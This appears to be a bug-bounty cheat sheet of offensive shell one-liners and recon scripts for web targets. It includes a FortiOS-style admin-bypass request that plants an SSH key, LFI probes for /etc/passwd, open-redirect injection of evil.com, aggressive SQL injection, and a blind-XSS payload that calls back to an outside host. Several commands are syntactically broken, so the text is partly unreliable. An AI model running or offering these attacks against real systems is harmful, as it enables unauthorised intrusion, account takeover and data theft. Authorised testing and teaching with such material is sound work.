Nuclei Command
~ > nuclei -a ransomsec -target /tmp/dangerous-shell.sh
~ > nuclei -l ./targets.txt -t ./CVE-2022-35405.yaml

FFUF Command
~ > ffuf -u https://codingo.io/FUZZ -w ./wordlist -recursion -e .bak
~ > ffuf -u https://rendering-prd.redacted.com/FUZZ -w english-words.txt -mc all -fw 6
~ > ffuf -c -w HOST:hosts.txt -w ~/wordlist/words.txt -u HOST/FUZZ -mc 200 
~ > ffuf -w "host_list.txt:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -x PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000;' -d '{"ssh-public-key1" "h4x0r"}' -mr "SSH" -r -x http://127.0.0.1:8080

Ghauri Command
~ > ghauri -r sqli-req.txt --dbms=MySQL --technique=T --current-db

SQLMAP Command
~ > sqlmap -r sqli-req.txt --current-db --technique=T --dbms=MySQL --level=2 --risk=3 --random-agent --no-cast

HTTPX Command
~ > cat domains.txt | httpx -path wordlist.txt -fc 400,403,404

# Noobtip Find Subdomains via @owasp amass and performa quick scan of all discovered subdomains via NMAP.
~ > amass db -show -d TARGET 2>/dev/null | grep TARGET | while read HOST; do nmap -sC -v -Pn $HOST; done

Local File Inclusion : by @dwisiswant0
~ > gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -C 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

Waybackurls command
~ > waybackurls example.com | grep -a -i \=http | bhedak ' http://evil.com' | while read host do; do curl -s 
-L $ host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done

# Search JS using Gau + grep
~ > gau -subs DOMAIN | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> js-output.txt

# IDOR Command
~ > cat urls.txt | grep "id=[\d]*" | tee idor.txt

# Recon Tools Example
~ > cat rootDomains.txt | assetfinder subs-only | httpx -p 80,443,8080,8443,9000 -nc -silent > hosts.txt; 
~ > katana -list hosts.txt -nc -silent -c 50 | nuclei -t <your templates>

# Automatic One Liner SSRF: 
~ > assetfinder --subs-only target | httprobe | gau | gf ssrf | nuclei -t nuclei-templates/vulnerabilities/microstrategy-ssrf.yaml

# Manual testing SSRF
~ > assetfinder --subs-only target | httprobe | gau | gf ssrf | parallel -j curl --proxy http://127.0.0.1:8080 -sk 2>/dev/null

Then use burp callobrator to manipulate SSRF

# SSRF TIP:
# Collect .js files
~ > subfinder -d <domain> -silent -all | httpx | getJS -complete | tee -a <domain>.js

# Collect Endpoints 
~ > cat <domain>.js | linkJs -m endpoints | tee -a endpoints.txt

# Construct a wordlist
~ > ./wordlistgen endpoints.txt parameters.txt | tee -a wordlist

# Should be in the format
~ > /endpoint/?url=FUZZ 
# Run FFUF against the domain and wordlist



-------------------------------------------------------------------------------------
# ReconOne # 1

#!/bin/bash
# $1 => example.domain

amass enum --passive -d $1 -o domains_$1
assetfinder --subs-only $1 | tee -a domains_$1

subfinder -d $1 -o domains_subfinder_$1
cat domains_subfinder_$1 | tee -a domain_$1

# filtering the domains
sort -u domains_$1 -o domains_$1
cat domains_$1 | filter-resolved | tee -a domains_$1.txt

cat domains_$1 | ~/go/bin/httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt
----------------------------------------------------------------------------------------

---------------------------------------------------------------------------------------
# ReconTwo # 2

gauq() {
  gau $1 -subs | \
  grep "=" | \
  cgrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | \
  qsreplace -a
}

sqliz() {
  gauq $1 | python3 $HOME/Tools/DSSS/dsss.py
}

bxss() {
  BLIND="https://your.xss.ht"
  gauq $1 | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | \
  dalfox pipe -b $BLIND
}
--------------------------------------------------------------------------------------------



